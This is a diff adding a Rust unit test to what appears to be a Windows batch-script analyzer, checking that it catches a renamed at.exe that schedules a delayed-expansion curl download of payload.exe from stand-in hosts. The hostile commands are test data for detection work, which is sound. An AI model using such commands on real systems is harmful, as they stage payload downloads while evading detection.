@@ -50367,6 +50367,24 @@ C:\Users\Public\at.tmp 23:59 cmd.exe /c curl -o payload.exe https://copied-at.ex
     }
 
     #[test]
+    fn copied_at_alias_scheduled_comspec_child_preserves_delayed_expansion() {
+        let script = br#"copy C:\Windows\System32\at.exe C:\Users\Public\at.tmp
+C:\Users\Public\at.tmp 23:59 %COMSPEC% /V:ON /c set U=https://copied-at-delayed.example/payload.exe&&curl -o payload.exe ^!U^!"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://copied-at-delayed.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "copied at delayed child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn at_scheduled_quoted_cmd_child_is_analyzed() {
         let script = br#"at 23:59 "cmd.exe /V:ON /c set U=https://at-quoted.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
